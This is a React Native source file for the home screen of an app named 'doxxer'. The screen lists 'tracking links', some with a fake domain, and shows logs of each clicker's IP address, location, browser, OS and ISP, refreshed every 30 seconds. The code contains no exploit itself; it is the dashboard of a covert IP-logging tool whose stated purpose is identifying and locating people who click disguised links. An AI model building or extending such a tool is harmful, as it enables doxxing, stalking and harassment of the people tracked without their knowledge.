import React, { useState, useEffect, useRef } from 'react';
import { StyleSheet, View, Text, SafeAreaView, FlatList, TouchableOpacity, StatusBar, ActivityIndicator, Image } from 'react-native';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';

const HomePage = ({ navigation }) => {
  const [logs, setLogs] = useState([]);
  const [links, setLinks] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedLinkId, setSelectedLinkId] = useState(null);
  const [error, setError] = useState(null);
  const [apiUrl, setApiUrl] = useState('');
  const [lastRefresh, setLastRefresh] = useState('');
  const refreshTimerRef = useRef(null);

  useEffect(() => {
    loadSettings();
    return () => {
      // Clean up timer on unmount
      if (refreshTimerRef.current) {
        clearInterval(refreshTimerRef.current);
      }
    };
  }, []);

  const loadSettings = async () => {
    try {
      const savedApiUrl = await AsyncStorage.getItem('apiUrl');
      if (savedApiUrl) {
        setApiUrl(savedApiUrl);
        fetchData(savedApiUrl);
        
        // Check if auto refresh is enabled
        const autoRefresh = await AsyncStorage.getItem('autoRefresh');
        if (autoRefresh === 'true') {
          setupAutoRefresh(savedApiUrl);
        }
      } else {
        setError('API URL not configured. Please go to Settings to set it up.');
        setLoading(false);
      }
    } catch (error) {
      console.error('Error loading settings:', error);
      setError('Failed to load settings. Please go to Settings and configure the API URL.');
      setLoading(false);
    }
  };

  const setupAutoRefresh = (url) => {
    // Clear any existing refresh timer
    if (refreshTimerRef.current) {
      clearInterval(refreshTimerRef.current);
    }
    
    // Set up new refresh timer (every 30 seconds)
    refreshTimerRef.current = setInterval(() => {
      fetchData(url);
    }, 30000);
  };

  // Listen for navigation focus to reload settings in case they changed
  useEffect(() => {
    const unsubscribe = navigation.addListener('focus', () => {
      loadSettings();
    });
    return unsubscribe;
  }, [navigation]);

  const fetchData = async (url = apiUrl) => {
    if (!url) {
      setError('API URL not configured. Please go to Settings to set it up.');
      setLoading(false);
      return;
    }
    
    setLoading(true);
    setError(null);
    
    try {
      // Fetch all tracking links
      const linksResponse = await axios.get(`${url}/links`);
      setLinks(linksResponse.data);
      
      // Fetch all IP logs
      const logsResponse = await axios.get(`${url}/logs`);
      setLogs(logsResponse.data);
      
      const now = new Date();
      setLastRefresh(`Last refreshed: ${now.toLocaleTimeString()}`);
      setLoading(false);
    } catch (err) {
      console.error('Error fetching data:', err);
      setError('Failed to load data. Check your connection and API URL in Settings.');
      setLoading(false);
    }
  };

  const filteredLogs = selectedLinkId 
    ? logs.filter(log => log.linkId === selectedLinkId)
    : logs;

  const renderLinkItem = ({ item }) => (
    <TouchableOpacity
      style={[
        styles.linkItem,
        selectedLinkId === item.id && styles.selectedLink
      ]}
      onPress={() => setSelectedLinkId(item.id === selectedLinkId ? null : item.id)}
    >
      <Text style={styles.linkText}>
        {item.alias} {item.fakeDomain ? `(${item.fakeDomain})` : ''}
      </Text>
      <Text style={styles.clicksText}>{item.clicks} clicks</Text>
    </TouchableOpacity>
  );

  const renderLogItem = ({ item }) => {
    const linkObj = links.find(l => l.id === item.linkId);
    
    return (
      <TouchableOpacity 
        style={styles.logItem}
        onPress={() => navigation.navigate('IpDetail', {
          log: item,
          linkInfo: linkObj
        })}
      >
        <View style={styles.logHeader}>
          <Text style={styles.ipText}>{item.ipAddress}</Text>
          <Text style={styles.dateText}>
            {new Date(item.timestamp).toLocaleString()}
          </Text>
        </View>
        
        <Text style={styles.locationText}>
          {item.location || 'Location unknown'}
        </Text>
        
        <View style={styles.logDetails}>
          <Text style={styles.detailText}>
            Link: {linkObj ? linkObj.alias : 'Unknown'}
          </Text>
          <Text style={styles.detailText}>
            Browser: {item.browser || 'Unknown'}
          </Text>
          <Text style={styles.detailText}>
            OS: {item.os || 'Unknown'}
          </Text>
          <Text style={styles.detailText}>
            ISP: {item.isp || 'Unknown'}
          </Text>
        </View>
      </TouchableOpacity>
    );
  };

  if (loading) {
    return (
      <SafeAreaView style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#FF0000" />
        <Text style={styles.loadingText}>Loading data...</Text>
      </SafeAreaView>
    );
  }

  if (error) {
    return (
      <SafeAreaView style={styles.errorContainer}>
        <Text style={styles.errorText}>{error}</Text>
        <TouchableOpacity style={styles.retryButton} onPress={fetchData}>
          <Text style={styles.retryButtonText}>Retry</Text>
        </TouchableOpacity>
      </SafeAreaView>
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" />
      
      <View style={styles.header}>
        <View style={styles.logoContainer}>
          <Image 
            source={require('./assets/icon.png')} 
            style={styles.logo} 
            resizeMode="contain"
          />
          <View style={styles.titleContainer}>
            <Text style={styles.title}>doxxer</Text>
            <Text style={styles.subtitle}>by 『ꪶ𝒁𝑬𝑭𝑰𝑹𝜣̸͢ꫂ 𝒜𝓵ℯ𝓂ℴ𝓷</Text>
          </View>
        </View>
        <View style={styles.headerButtons}>
          <TouchableOpacity 
            style={styles.settingsButton} 
            onPress={() => navigation.navigate('Settings')}
          >
            <Text style={styles.buttonText}>Settings</Text>
          </TouchableOpacity>
          <TouchableOpacity 
            style={styles.refreshButton} 
            onPress={fetchData}
          >
            <Text style={styles.buttonText}>Refresh</Text>
          </TouchableOpacity>
        </View>
      </View>
      
      <View style={styles.linksContainer}>
        <Text style={styles.sectionTitle}>Tracking Links</Text>
        <FlatList
          data={links}
          renderItem={renderLinkItem}
          keyExtractor={item => item.id}
          horizontal
          showsHorizontalScrollIndicator={false}
        />
      </View>
      
      <View style={styles.logsContainer}>
        <View style={styles.logHeaderContainer}>
          <Text style={styles.sectionTitle}>
            {selectedLinkId 
              ? `Logs for ${links.find(l => l.id === selectedLinkId)?.alias || 'Selected Link'}`
              : 'All IP Logs'}
          </Text>
          {lastRefresh ? <Text style={styles.refreshText}>{lastRefresh}</Text> : null}
        </View>
        
        {filteredLogs.length === 0 ? (
          <View style={styles.emptyContainer}>
            <Text style={styles.emptyText}>No logs found</Text>
          </View>
        ) : (
          <FlatList
            data={filteredLogs}
            renderItem={renderLogItem}
            keyExtractor={item => item.id.toString()}
            showsVerticalScrollIndicator={false}
          />
        )}
      </View>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#121212',
  },
  logoContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 8,
  },
  logo: {
    width: 40,
    height: 40,
    marginRight: 10,
  },
  titleContainer: {
    flexDirection: 'column',
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#121212',
  },
  loadingText: {
    marginTop: 10,
    color: '#FFFFFF',
    fontSize: 16,
  },
  errorContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#121212',
    padding: 20,
  },
  errorText: {
    color: '#FF6B6B',
    fontSize: 16,
    textAlign: 'center',
    marginBottom: 20,
  },
  retryButton: {
    backgroundColor: '#333',
    paddingVertical: 12,
    paddingHorizontal: 24,
    borderRadius: 8,
  },
  retryButtonText: {
    color: '#FFFFFF',
    fontSize: 16,
    fontWeight: 'bold',
  },
  header: {
    padding: 16,
    backgroundColor: '#1E1E1E',
    borderBottomWidth: 1,
    borderBottomColor: '#333',
    alignItems: 'center',
  },
  title: {
    fontSize: 28,
    fontWeight: 'bold',
    color: '#FF0000',
    textShadowColor: 'rgba(255, 0, 0, 0.5)',
    textShadowOffset: { width: 0, height: 0 },
    textShadowRadius: 10,
  },
  subtitle: {
    fontSize: 12,
    color: '#888',
    marginTop: 4,
  },
  headerButtons: {
    flexDirection: 'row',
    marginTop: 10,
    justifyContent: 'center',
  },
  settingsButton: {
    backgroundColor: '#333',
    paddingVertical: 8,
    paddingHorizontal: 16,
    borderRadius: 4,
    marginRight: 8,
  },
  refreshButton: {
    backgroundColor: '#333',
    paddingVertical: 8,
    paddingHorizontal: 16,
    borderRadius: 4,
  },
  buttonText: {
    color: '#FFFFFF',
    fontSize: 14,
  },
  linksContainer: {
    padding: 16,
    borderBottomWidth: 1,
    borderBottomColor: '#333',
  },
  sectionTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#FFF',
    flex: 1,
  },
  linkItem: {
    backgroundColor: '#1E1E1E',
    borderRadius: 8,
    padding: 12,
    marginRight: 10,
    minWidth: 120,
  },
  selectedLink: {
    backgroundColor: '#333',
    borderWidth: 1,
    borderColor: '#FF0000',
  },
  linkText: {
    color: '#FFF',
    fontWeight: 'bold',
    fontSize: 14,
  },
  clicksText: {
    color: '#AAA',
    fontSize: 12,
    marginTop: 4,
  },
  logsContainer: {
    flex: 1,
    padding: 16,
  },
  logHeaderContainer: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 10,
  },
  refreshText: {
    color: '#888',
    fontSize: 12,
    fontStyle: 'italic',
  },
  logItem: {
    backgroundColor: '#1E1E1E',
    borderRadius: 8,
    padding: 14,
    marginBottom: 10,
  },
  logHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginBottom: 8,
  },
  ipText: {
    color: '#FF0000',
    fontWeight: 'bold',
    fontSize: 16,
  },
  dateText: {
    color: '#888',
    fontSize: 12,
  },
  locationText: {
    color: '#DDD',
    fontSize: 14,
    marginBottom: 8,
  },
  logDetails: {
    backgroundColor: '#252525',
    borderRadius: 4,
    padding: 8,
  },
  detailText: {
    color: '#AAA',
    fontSize: 12,
    marginBottom: 4,
  },
  emptyContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  emptyText: {
    color: '#888',
    fontSize: 16,
  },
});

export default HomePage;